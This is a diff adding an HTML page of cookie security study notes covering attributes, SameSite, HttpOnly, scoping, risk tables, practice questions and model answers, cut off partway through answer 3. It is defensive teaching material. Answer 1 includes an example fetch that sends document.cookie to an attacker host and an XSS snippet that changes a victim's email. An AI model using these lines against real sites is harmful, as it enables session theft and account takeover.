@@ -1,0 +1,1703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cookies — HTTP State Management</title>
+
+  <!-- Mermaid JS (CDN). Render lazily so very large pages stay scrollable. -->
+  <script type="module">
+    import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs';
+    mermaid.initialize({ startOnLoad: false, theme: 'neutral' });
+
+    function renderMermaidBlock(el) {
+      if (el.dataset.mermaidState) return;
+      el.dataset.mermaidState = 'rendering';
+      mermaid.run({ nodes: [el] })
+        .then(function () {
+          el.dataset.mermaidState = 'rendered';
+        })
+        .catch(function (err) {
+          el.dataset.mermaidState = 'error';
+          el.classList.add('mermaid-error');
+          console.error('Mermaid render failed:', err);
+        });
+    }
+
+    function initMermaidLazyRender() {
+      var blocks = Array.prototype.slice.call(document.querySelectorAll('.mermaid'));
+      if (!blocks.length) return;
+
+      if ('IntersectionObserver' in window) {
+        var observer = new IntersectionObserver(function (entries) {
+          entries.forEach(function (entry) {
+            if (!entry.isIntersecting) return;
+            observer.unobserve(entry.target);
+            renderMermaidBlock(entry.target);
+          });
+        }, { rootMargin: '800px 0px', threshold: 0.01 });
+
+        blocks.forEach(function (block) {
+          observer.observe(block);
+        });
+      } else {
+        var index = 0;
+        function renderBatch() {
+          blocks.slice(index, index + 8).forEach(renderMermaidBlock);
+          index += 8;
+          if (index < blocks.length) window.setTimeout(renderBatch, 50);
+        }
+        renderBatch();
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', initMermaidLazyRender);
+    } else {
+      initMermaidLazyRender();
+    }
+  </script>
+
+  <!-- Syntax highlighting (optional, no build step required) -->
+  <link rel="stylesheet"
+        href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  <style>
+    *  { box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 32px 24px;
+      line-height: 1.7;
+      color: #24292f;
+      background: #fff;
+    }
+
+    /* Typography */
+    h1, h2, h3, h4, h5, h6 {
+      margin-top: 1.6em;
+      margin-bottom: 0.4em;
+      border-bottom: 1px solid #d0d7de;
+      padding-bottom: 0.3em;
+      font-weight: 600;
+    }
+    h1 { font-size: 2em; }
+    h2 { font-size: 1.5em; }
+    a { color: #0969da; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* Code */
+    pre {
+      background: #f6f8fa;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 16px;
+      overflow-x: auto;
+    }
+    code {
+      background: #f6f8fa;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: "Cascadia Code", "Fira Code", "Courier New", monospace;
+      font-size: 0.9em;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+      border-radius: 0;
+    }
+
+    /* Tables */
+    table {
+      border-collapse: collapse;
+      width: 100%;
+      margin: 16px 0;
+      font-size: 0.92em;
+    }
+    th, td {
+      border: 1px solid #d0d7de;
+      padding: 8px 14px;
+      text-align: left;
+      vertical-align: top;
+    }
+    th {
+      background: #f6f8fa;
+      font-weight: 600;
+    }
+    tr:nth-child(even) { background: #f9f9f9; }
+
+    /* Blockquotes */
+    blockquote {
+      border-left: 4px solid #d0d7de;
+      margin: 0 0 16px 0;
+      padding: 8px 16px;
+      color: #57606a;
+      background: #f6f8fa;
+      border-radius: 0 6px 6px 0;
+    }
+
+    /* Mermaid diagrams */
+    .mermaid {
+      background: #fafbfc;
+      border: 1px solid #d0d7de;
+      border-radius: 6px;
+      padding: 20px;
+      margin: 20px 0;
+      overflow-x: auto;
+      text-align: center;
+    }
+    pre.mermaid {
+      white-space: pre;
+    }
+    .mermaid svg {
+      max-width: 100%;
+      height: auto;
+    }
+    .mermaid[data-mermaid-state="rendering"] {
+      min-height: 140px;
+    }
+    .mermaid-error {
+      text-align: left;
+      color: #57606a;
+    }
+
+    /* Images */
+    img {
+      max-width: 100%;
+      height: auto;
+      border-radius: 6px;
+      margin: 14px 0;
+      border: 1px solid #d0d7de;
+      background: #fff;
+      cursor: zoom-in;
+      display: block;
+    }
+
+    /* ── Image zoom overlay ─────────────────────────────── */
+    #img-zoom-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.82);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+    }
+    #img-zoom-overlay.active { display: flex; }
+    #img-zoom-wrap {
+      position: relative;
+      overflow: hidden;
+      width: 100vw;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: grab;
+    }
+    #img-zoom-wrap.dragging { cursor: grabbing; }
+    #img-zoom-el {
+      max-width: none;
+      max-height: none;
+      border: none;
+      margin: 0;
+      border-radius: 4px;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.6);
+      transform-origin: center center;
+      user-select: none;
+      pointer-events: none;
+    }
+    #img-zoom-controls {
+      position: fixed;
+      bottom: 24px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: flex;
+      gap: 8px;
+      align-items: center;
+      background: rgba(20,20,20,0.88);
+      padding: 7px 18px;
+      border-radius: 24px;
+      z-index: 10000;
+    }
+    #img-zoom-controls button {
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.1em;
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background 0.15s;
+    }
+    #img-zoom-controls button:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-level {
+      color: #ccc;
+      font-size: 0.82em;
+      min-width: 46px;
+      text-align: center;
+      font-family: monospace;
+    }
+    #img-zoom-close {
+      position: fixed;
+      top: 16px;
+      right: 20px;
+      background: none;
+      border: 1px solid rgba(255,255,255,0.35);
+      color: #fff;
+      font-size: 1.3em;
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 10000;
+      transition: background 0.15s;
+    }
+    #img-zoom-close:hover { background: rgba(255,255,255,0.15); }
+    #img-zoom-hint {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      color: rgba(200,200,200,0.7);
+      font-size: 0.76em;
+      font-family: -apple-system, sans-serif;
+      z-index: 10000;
+      pointer-events: none;
+    }
+
+    /* Breadcrumb / path */
+    .file-path {
+      font-size: 0.8em;
+      color: #57606a;
+      margin-bottom: 24px;
+      font-family: monospace;
+    }
+
+    /* Horizontal rule */
+    hr { border: none; border-top: 2px solid #d0d7de; margin: 24px 0; }
+  </style>
+</head>
+<body>
+  <p class="file-path">Source: web\Browser-Security\Cookies\README.md</p>
+<h1 id="cookies-http-state-management">Cookies — HTTP State Management</h1>
+<p><strong>Category:</strong> Browser Security — Session State, Authentication, Tracking<br />
+<strong>RFC:</strong> RFC 6265 (HTTP State Management Mechanism); RFC 6265bis (in progress)<br />
+<strong>Applies To:</strong> All browser-based web applications</p>
+<h2 id="overview">Overview</h2>
+<p>HTTP cookies are name-value pairs stored by the browser and automatically attached to requests matching the cookie's scope. They are the primary mechanism for session management, authentication state, personalization, and tracking across the web. From a security perspective, cookies are the most valuable credential a browser carries — a stolen valid session cookie is essentially equivalent to a stolen password. Cookie security is not just about setting a few flags; it is about understanding exactly what the browser will send, to whom, across what origins, and what JavaScript can access.</p>
+<p>At Google scale, every Google service relies on secure cookies for authenticated sessions across billions of users. Even minor misconfiguration — a missing <code>SameSite</code> attribute, a too-broad domain scope, or a missing <code>Secure</code> flag — can result in session theft, CSRF attacks, or cross-subdomain data leakage for millions of users simultaneously.</p>
+<h2 id="how-it-works">How It Works</h2>
+<h3 id="core-mechanics">Core Mechanics</h3>
+<p>The server sets a cookie via the <code>Set-Cookie</code> response header. The browser stores it and sends it back in the <code>Cookie</code> request header on matching future requests.</p>
+<p><strong>Setting a Cookie:</strong></p>
+<pre><code>Set-Cookie: sessionId=abc123; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=3600
+</code></pre>
+<p><strong>Cookie Attributes:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Values</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Name=Value</code></td>
+<td>Any string</td>
+<td>The cookie data</td>
+</tr>
+<tr>
+<td><code>Domain</code></td>
+<td>e.g., <code>example.com</code></td>
+<td>Scope: host and all subdomains. Defaults to exact host if omitted</td>
+</tr>
+<tr>
+<td><code>Path</code></td>
+<td>e.g., <code>/</code> or <code>/api</code></td>
+<td>URL path scope; defaults to path of the Set-Cookie response</td>
+</tr>
+<tr>
+<td><code>Secure</code></td>
+<td>Flag (no value)</td>
+<td>Cookie sent only over HTTPS connections</td>
+</tr>
+<tr>
+<td><code>HttpOnly</code></td>
+<td>Flag (no value)</td>
+<td>Cookie inaccessible to JavaScript (<code>document.cookie</code> returns empty for it)</td>
+</tr>
+<tr>
+<td><code>SameSite</code></td>
+<td><code>Strict</code>, <code>Lax</code>, <code>None</code></td>
+<td>Controls cross-site sending behavior</td>
+</tr>
+<tr>
+<td><code>Max-Age</code></td>
+<td>Seconds</td>
+<td>Session cookie if absent or 0; persistent if positive</td>
+</tr>
+<tr>
+<td><code>Expires</code></td>
+<td>Date</td>
+<td>Absolute expiry date; <code>Max-Age</code> takes precedence if both present</td>
+</tr>
+<tr>
+<td><code>Partitioned</code></td>
+<td>Flag (CHIPS)</td>
+<td>Cookie scoped to top-level site context, not shared across sites</td>
+</tr>
+</tbody>
+</table>
+<h3 id="samesite-attribute-deep-dive">SameSite Attribute Deep Dive</h3>
+<p><code>SameSite</code> is the primary CSRF defense at the cookie level:</p>
+<table>
+<thead>
+<tr>
+<th>SameSite Value</th>
+<th>When Cookie Is Sent</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Strict</code></td>
+<td>Only on same-site navigations; never on cross-site requests including top-level nav</td>
+<td>Maximum protection; may break OAuth/OIDC redirect flows</td>
+</tr>
+<tr>
+<td><code>Lax</code></td>
+<td>Same-site + safe top-level cross-site navigations (GET, HEAD); not on cross-site POST/PUT/DELETE</td>
+<td>Default in modern browsers; good balance</td>
+</tr>
+<tr>
+<td><code>None</code></td>
+<td>All requests including cross-site, but <strong>requires <code>Secure</code></strong></td>
+<td>Required for cross-site use (e.g., embedded widgets, federated auth iframes)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Same-site vs same-origin:</strong> SameSite uses <strong>registrable domain</strong> matching (eTLD+1), not origin matching. <code>app.example.com</code> and <code>api.example.com</code> are same-site. <code>app.example.com</code> and <code>attacker.com</code> are cross-site.</p>
+<h3 id="httponly-javascript-isolation">HttpOnly — JavaScript Isolation</h3>
+<p>When <code>HttpOnly</code> is set, the cookie is not accessible via <code>document.cookie</code>, <code>XMLHttpRequest</code>, or the Fetch API's cookie store. It is only automatically sent by the browser at the network layer. This prevents the most common XSS-to-session-theft pathway: an XSS payload reading <code>document.cookie</code> and exfiltrating the session token. However, <code>HttpOnly</code> does <strong>not</strong> prevent XSS from making requests with the session cookie attached (the browser still sends it automatically).</p>
+<h3 id="cookie-scope-domain-and-path">Cookie Scope: Domain And Path</h3>
+<ul>
+<li>If <code>Domain=example.com</code> is set, cookie is sent to <code>example.com</code> <strong>and all subdomains</strong> (including <code>evil.example.com</code> if that subdomain is compromised).</li>
+<li>If <code>Domain</code> is omitted, cookie is only sent to the exact host that set it (more restrictive, better practice for session cookies).</li>
+<li><code>Path</code> further restricts scope to URL path prefixes, but path-based scoping is not a security control — any script on the domain can read path-scoped cookies.</li>
+</ul>
+<h3 id="cookie-partitioning-chips-cookies-having-independent-partitioned-state">Cookie Partitioning (CHIPS — Cookies Having Independent Partitioned State)</h3>
+<p>Modern browsers are introducing cookie partitioning to limit cross-site tracking. A partitioned cookie is stored with a key that includes both the cookie domain AND the top-level site. The same tracking cookie from <code>tracker.com</code> has separate state when accessed from <code>site-a.com</code> vs <code>site-b.com</code>. Set via the <code>Partitioned</code> attribute. Part of the broader third-party cookie deprecation effort.</p>
+<h3 id="step-by-step-flow">Step-by-Step Flow</h3>
+<pre class="mermaid">
+sequenceDiagram
+    participant Browser as Browser
+    participant Server as example.com
+
+    Browser->>Server: POST /login (credentials)
+    Server->>Server: Validate credentials, generate session ID
+    Server-->>Browser: 200 OK\nSet-Cookie: sid=abc123 HttpOnly Secure SameSite=Lax Max-Age=3600
+    Browser->>Browser: Store cookie in cookie jar
+
+    Browser->>Server: GET /dashboard (automatic cookie attach)
+    Note over Browser,Server: Cookie: sid=abc123 sent automatically
+    Server->>Server: Validate session ID
+    Server-->>Browser: 200 OK with dashboard content
+</pre>
+<pre class="mermaid">
+flowchart TD
+    A[Request to matching domain/path] --> B{Is connection HTTPS?}
+    B -- No and Secure flag set --> C[Cookie NOT sent]
+    B -- Yes or no Secure flag --> D{SameSite check}
+    D --> E{Cross-site request?}
+    E -- No --> F[Cookie sent]
+    E -- Yes, SameSite=Strict --> G[Cookie NOT sent]
+    E -- Yes, SameSite=Lax, safe method top-level nav --> F
+    E -- Yes, SameSite=Lax, non-safe or non-top-level --> G
+    E -- Yes, SameSite=None with Secure --> F
+</pre>
+<h2 id="what-can-go-wrong">What Can Go Wrong</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Failure / Attack</th>
+<th>Root Cause</th>
+<th>Impact</th>
+<th>Likelihood</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Session token theft via XSS</td>
+<td>Missing <code>HttpOnly</code> flag; session cookie readable by JavaScript</td>
+<td>Account takeover</td>
+<td>High</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Session cookie sent over HTTP</td>
+<td>Missing <code>Secure</code> flag; cookie sent on HTTP connections</td>
+<td>Network interception; session theft</td>
+<td>High</td>
+</tr>
+<tr>
+<td>3</td>
+<td>CSRF via cookie automatic sending</td>
+<td>Missing or weak <code>SameSite</code>; cookie sent on cross-site POST</td>
+<td>Unauthorized state-changing actions</td>
+<td>High</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cookie scope too broad</td>
+<td><code>Domain=example.com</code> sends cookie to all subdomains including compromised ones</td>
+<td>Cross-subdomain session theft</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>5</td>
+<td>No expiry on session cookie</td>
+<td>Missing <code>Max-Age</code>; session persists until browser closes</td>
+<td>Long exposure window if browser left open</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Cookie theft via network MITM</td>
+<td>Secure flag missing; cookie sent on HTTP redirect or mixed content</td>
+<td>Session hijacking</td>
+<td>High</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Cookie injection via subdomain</td>
+<td>Attacker-controlled subdomain sets cookie for parent domain via <code>Domain=</code> attribute</td>
+<td>Session fixation or poisoning</td>
+<td>Med</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Browser storage XSS for non-HttpOnly tokens</td>
+<td>Using <code>localStorage</code>/<code>sessionStorage</code> for tokens instead of cookies</td>
+<td>XSS theft of all tokens without HttpOnly protection</td>
+<td>High</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Third-party cookie tracking</td>
+<td>Cross-site cookies tied to tracking pixels and analytics</td>
+<td>Privacy violation; user tracking</td>
+<td>High</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Cookie overflow / shadow cookies</td>
+<td>Many cookies for same domain; attacker fills cookie jar to displace legitimate cookies</td>
+<td>Session state disruption</td>
+<td>Low</td>
+</tr>
+<tr>
+<td>11</td>
+<td>Cookie tossing (subdomain cookie injection)</td>
+<td><code>a.example.com</code> sets <code>Domain=example.com</code> cookie that shadows server-set cookie</td>
+<td>CSRF token bypass, session confusion</td>
+<td>Med</td>
+</tr>
+</tbody>
+</table>
+<h2 id="mitigation-controls">Mitigation Controls</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Failure</th>
+<th>Mitigation</th>
+<th>Layer / Where Applied</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>XSS cookie theft</td>
+<td>Set <code>HttpOnly</code> on all authentication and session cookies</td>
+<td><code>Set-Cookie</code> header on login response</td>
+</tr>
+<tr>
+<td>2</td>
+<td>HTTP cookie exposure</td>
+<td>Set <code>Secure</code> flag on all cookies containing sensitive data</td>
+<td><code>Set-Cookie</code> header</td>
+</tr>
+<tr>
+<td>3</td>
+<td>CSRF</td>
+<td>Set <code>SameSite=Lax</code> at minimum; <code>SameSite=Strict</code> for highest protection; add CSRF tokens as defense-in-depth</td>
+<td><code>Set-Cookie</code> + CSRF middleware</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Overbroad domain scope</td>
+<td>Omit <code>Domain</code> attribute for session cookies (exact-host scoping); only set <code>Domain</code> when subdomain access is required</td>
+<td>Cookie design</td>
+</tr>
+<tr>
+<td>5</td>
+<td>No expiry</td>
+<td>Set <code>Max-Age</code> appropriate to session lifetime; implement server-side session expiry</td>
+<td>Session management layer</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Network interception</td>
+<td><code>Secure</code> flag + HSTS to prevent HTTP fallback</td>
+<td>Cookie flags + HSTS header</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Cookie injection via subdomain</td>
+<td>Limit trusted subdomains; use <code>__Host-</code> prefix (forces Secure, no Domain, Path=/)</td>
+<td>Cookie naming convention</td>
+</tr>
+<tr>
+<td>8</td>
+<td>localStorage for auth tokens</td>
+<td>Use <code>HttpOnly</code> cookies for session tokens; avoid localStorage for secrets</td>
+<td>Application architecture</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Third-party tracking</td>
+<td>Adopt CHIPS / cookie partitioning; remove cross-site cookies where possible</td>
+<td>Cookie design + privacy policy</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Cookie overflow</td>
+<td>Limit number of cookies per domain; use a single session cookie</td>
+<td>Session design</td>
+</tr>
+<tr>
+<td>11</td>
+<td>Cookie tossing</td>
+<td>Use <code>__Host-</code> prefix; validate that the expected session cookie is the one being acted upon</td>
+<td>Cookie naming + server validation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="cookie-prefix-security">Cookie Prefix Security</h3>
+<p>Modern browsers support cookie prefixes that enforce attribute requirements:</p>
+<table>
+<thead>
+<tr>
+<th>Prefix</th>
+<th>Requirements Enforced</th>
+<th>Protection</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>__Secure-</code></td>
+<td>Must have <code>Secure</code> flag</td>
+<td>Prevents insecure setting</td>
+</tr>
+<tr>
+<td><code>__Host-</code></td>
+<td>Must have <code>Secure</code>, no <code>Domain</code>, <code>Path=/</code></td>
+<td>Prevents subdomain injection and scope broadening</td>
+</tr>
+</tbody>
+</table>
+<p>Example: <code>Set-Cookie: __Host-sessionId=abc123; Secure; Path=/; HttpOnly; SameSite=Strict</code></p>
+<h3 id="top-3-critical-mitigations">Top 3 Critical Mitigations</h3>
+<ol>
+<li><strong>Always set <code>HttpOnly</code> on authentication and session cookies.</strong> The most common XSS exploitation path is JavaScript reading <code>document.cookie</code> and exfiltrating the session token. <code>HttpOnly</code> closes this single most-used attack vector. It does not stop all XSS harm, but it removes the easiest and most impactful prize.</li>
+<li><strong>Set <code>SameSite=Lax</code> or <code>Strict</code> on session cookies.</strong> Cross-site request forgery relies on the browser automatically attaching cookies to cross-site requests. <code>SameSite=Lax</code> (the modern browser default) blocks the most common CSRF patterns. <code>SameSite=Strict</code> blocks all cross-site cookie sending, which is the strongest protection but may break redirect-based flows.</li>
+<li><strong>Set <code>Secure</code> flag and deploy HSTS.</strong> A cookie without <code>Secure</code> can be sent over HTTP, even on a site that primarily uses HTTPS. One mixed-content load or HTTP redirect can expose the session cookie in plaintext. <code>Secure</code> flag + HSTS together ensure cookies never travel over unencrypted connections.</li>
+</ol>
+<h2 id="practice-questions">Practice Questions</h2>
+<ol>
+<li>What does <code>HttpOnly</code> actually prevent? Does it stop all XSS harm to sessions?</li>
+<li>What is the difference between <code>SameSite=Strict</code> and <code>SameSite=Lax</code>? When would each be appropriate?</li>
+<li>A session cookie is set with <code>Domain=example.com</code>. What subdomains will receive it? What is the security risk?</li>
+<li>What is cookie tossing and how do the <code>__Host-</code> and <code>__Secure-</code> prefixes prevent it?</li>
+<li>Why is storing a session token in <code>localStorage</code> generally worse than storing it in an <code>HttpOnly</code> cookie?</li>
+<li>What is the order of priority for <code>Max-Age</code> vs <code>Expires</code> if both are set on a cookie?</li>
+<li>How does <code>SameSite=None; Secure</code> interact with third-party cookie deprecation?</li>
+<li>What is CHIPS (cookie partitioning) and why are browsers implementing it?</li>
+<li>A developer sets <code>SameSite=Lax</code> but claims this fully prevents CSRF. Name one CSRF scenario <code>Lax</code> does not prevent.</li>
+<li>At Google scale, how would you audit millions of cookie <code>Set-Cookie</code> headers across thousands of services to ensure all session cookies have <code>HttpOnly</code>, <code>Secure</code>, and appropriate <code>SameSite</code> values?</li>
+</ol>
+<h2 id="answers-to-advanced-questions">Answers to advanced Questions</h2>
+<h1 id="cookie-security-advanced-model-answers">Cookie Security — advanced Model Answers</h1>
+<h2 id="1-what-does-httponly-actually-prevent-does-it-stop-all-xss-harm-to-sessions">1. What does <code>HttpOnly</code> actually prevent? Does it stop all XSS harm to sessions?</h2>
+<p><code>HttpOnly</code> prevents JavaScript from directly reading the cookie through browser APIs like <code>document.cookie</code>. MDN describes <code>HttpOnly</code> as a directive that forbids JavaScript access to the cookie; the cookie is still sent with matching HTTP requests. (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com" title="Set-Cookie header - HTTP - MDN Web Docs">MDN Web Docs</a>)</p>
+<p>Example:</p>
+<pre><code class="language-http">Set-Cookie: session=abc123; Secure; HttpOnly; SameSite=Lax; Path=/
+</code></pre>
+<p>With <code>HttpOnly</code>, this JavaScript cannot steal the session value directly:</p>
+<pre><code class="language-javascript">fetch(&quot;https://attacker.example/steal?c=&quot; + document.cookie);
+</code></pre>
+<p>But <code>HttpOnly</code> does <strong>not</strong> stop all XSS harm.</p>
+<p>An attacker with XSS can still:</p>
+<table>
+<thead>
+<tr>
+<th>XSS action</th>
+<th style="text-align: right;">Does <code>HttpOnly</code> stop it?</th>
+<th>Why</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Read <code>document.cookie</code> session value</td>
+<td style="text-align: right;">Yes</td>
+<td>Cookie hidden from JavaScript</td>
+</tr>
+<tr>
+<td>Make authenticated requests from the victim’s browser</td>
+<td style="text-align: right;">No</td>
+<td>Browser still attaches cookies</td>
+</tr>
+<tr>
+<td>Change email/password if no re-auth is required</td>
+<td style="text-align: right;">No</td>
+<td>XSS can submit forms/API calls</td>
+</tr>
+<tr>
+<td>Read page DOM data</td>
+<td style="text-align: right;">No</td>
+<td>XSS runs in the page</td>
+</tr>
+<tr>
+<td>Exfiltrate CSRF tokens from DOM</td>
+<td style="text-align: right;">No</td>
+<td>Unless protected elsewhere</td>
+</tr>
+<tr>
+<td>Modify page UI</td>
+<td style="text-align: right;">No</td>
+<td>XSS controls frontend execution</td>
+</tr>
+<tr>
+<td>Install fake login prompt</td>
+<td style="text-align: right;">No</td>
+<td>XSS can manipulate the page</td>
+</tr>
+<tr>
+<td>Abuse same-origin API responses</td>
+<td style="text-align: right;">No</td>
+<td>XSS can call APIs and read responses</td>
+</tr>
+</tbody>
+</table>
+<h3 id="example">Example</h3>
+<p>Even with an <code>HttpOnly</code> cookie, injected JavaScript can do:</p>
+<pre><code class="language-javascript">await fetch(&quot;/api/change-email&quot;, {
+  method: &quot;POST&quot;,
+  credentials: &quot;include&quot;,
+  headers: { &quot;Content-Type&quot;: &quot;application/json&quot; },
+  body: JSON.stringify({ email: &quot;attacker@example.com&quot; }),
+});
+</code></pre>
+<p>The script cannot read the cookie, but the browser sends it automatically.</p>
+<h3 id="model-answer">Model answer</h3>
+<blockquote>
+<p><code>HttpOnly</code> prevents direct cookie theft through JavaScript. It does not neutralize XSS. With XSS, the attacker can still act as the user inside the origin by sending authenticated requests, reading page data, modifying UI, and abusing APIs. <code>HttpOnly</code> reduces session exfiltration risk, but XSS must still be fixed at the source.</p>
+</blockquote>
+<hr />
+<h1 id="2-what-is-the-difference-between-samesitestrict-and-samesitelax-when-would-each-be-appropriate">2. What is the difference between <code>SameSite=Strict</code> and <code>SameSite=Lax</code>? When would each be appropriate?</h1>
+<p><code>SameSite</code> controls whether cookies are sent on cross-site requests. MDN defines <code>SameSite=Strict</code> as sending the cookie only for same-site requests, while <code>SameSite=Lax</code> sends the cookie for same-site requests and certain top-level cross-site navigations. (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com" title="Set-Cookie header - HTTP - MDN Web Docs">MDN Web Docs</a>)</p>
+<h2 id="comparison">Comparison</h2>
+<table>
+<thead>
+<tr>
+<th>Setting</th>
+<th style="text-align: right;">Cross-site subresource request</th>
+<th style="text-align: right;">Cross-site form POST</th>
+<th style="text-align: right;">Cross-site top-level GET navigation</th>
+<th>Typical use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Strict</code></td>
+<td style="text-align: right;">No</td>
+<td style="text-align: right;">No</td>
+<td style="text-align: right;">No</td>
+<td>Highly sensitive apps</td>
+</tr>
+<tr>
+<td><code>Lax</code></td>
+<td style="text-align: right;">No</td>
+<td style="text-align: right;">Usually no</td>
+<td style="text-align: right;">Yes</td>
+<td>General session cookies</td>
+</tr>
+<tr>
+<td><code>None; Secure</code></td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Yes</td>
+<td style="text-align: right;">Yes</td>
+<td>Third-party / embedded use cases</td>
+</tr>
+</tbody>
+</table>
+<h3 id="samesitestrict"><code>SameSite=Strict</code></h3>
+<p>Example:</p>
+<pre><code class="language-http">Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict; Path=/
+</code></pre>
+<p>With <code>Strict</code>, if the user clicks a link from email or another site to your app, the browser will not send the cookie on that first cross-site navigation. This is strong CSRF protection but may create usability friction.</p>
+<p>Appropriate for:</p>
+<ul>
+<li>Admin consoles</li>
+<li>Banking transaction pages</li>
+<li>Highly sensitive internal tools</li>
+<li>Step-up authentication cookies</li>
+<li>Security setting flows</li>
+<li>Re-authentication state</li>
+</ul>
+<h3 id="samesitelax"><code>SameSite=Lax</code></h3>
+<p>Example:</p>
+<pre><code class="language-http">Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Lax; Path=/
+</code></pre>
+<p>With <code>Lax</code>, cookies are sent on top-level safe navigations like clicking a link to the site. This works better for normal logged-in web experiences.</p>
+<p>Appropriate for:</p>
+<ul>
+<li>Normal web app session cookies</li>
+<li>SaaS applications</li>
+<li>Consumer apps</li>
+<li>Apps expecting users to arrive from links, email, Slack, search results</li>
+</ul>
+<h3 id="model-answer_1">Model answer</h3>
+<blockquote>
+<p><code>Strict</code> provides stronger CSRF resistance but can break expected navigation flows because cookies are not sent on cross-site entry. <code>Lax</code> is a practical default for many session cookies because it blocks most cross-site subresource and form-based CSRF while preserving top-level link navigation. For highly sensitive actions, <code>SameSite</code> should be combined with CSRF tokens, origin checks, and re-authentication.</p>
+</blockquote>
+<hr />
+<h1 id="3-a-session-cookie-is-set-with-domainexamplecom-what-subdomains-will-receive-it-what-is-the-security-risk">3. A session cookie is set with <code>Domain=example.com</code>. What subdomains will receive it? What is the security risk?</h1>
+<p>If a cookie is set with:</p>
+<pre><code class="language-http">Set-Cookie: session=abc; Domain=example.com; Path=/; Secure; HttpOnly
+</code></pre>
+<p>then the cookie is sent to:</p>
+<pre><code class="language-text">example.com
+www.example.com
+app.example.com
+api.example.com
+dev.example.com
+anything.example.com
+</code></pre>
+<p>MDN states that if <code>Domain</code> is specified, subdomains are always included, and leading dots such as <code>.example.com</code> are ignored by modern specifications. (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie?utm_source=chatgpt.com" title="Set-Cookie header - HTTP - MDN Web Docs">MDN Web Docs</a>)</p>
+<h2 id="security-risk">Security risk</h2>
+<p>The risk is that <strong>every subdomain becomes part of the session cookie trust boundary</strong>.</p>
+<p>If any subdomain is vulnerable or less trusted, it may create risk for the parent domain’s session model.</p>
+<h3 id="example_1">Example</h3>
+<p>Suppose:</p>
+<pre><code class="language-text">www.example.com        High-security production app
+blog.example.com       Old WordPress site
+dev.example.com        Forgotten staging app
+uploads.example.com    User-controlled content
+</code></pre>
+<p>If the session cookie is scoped to <code>Domain=example.com</code>, then it may be sent to all of these. A compromised or poorly isolated subdomain may be able to interfere with authentication flows, set conflicting cookies, or receive cookies unnecessarily.</p>
+<h3 id="better-approach">Better approach</h3>
+<p>Prefer host-only cookies:</p>
+<pre><code class="language-http">Set-Cookie: __Host-session=abc; Secure; HttpOnly; SameSite=Lax; Path=/
+</code></pre>
+<p>No <code>Domain</code> attribute means the cookie is scoped only to the exact host that set it.</p>
+<h3 id="model-answer_2">Model answer</h3>
+<blockquote>
+<p><code>Domain=example.com</code> makes the cookie available to <code>example.com</code> and all subdomains. The security risk is that the weakest subdomain becomes part of the authentication boundary. A stale dev host, takeover-prone subdomain, or user-content host can potentially influence or receive cookies intended for a more sensitive application.</p>
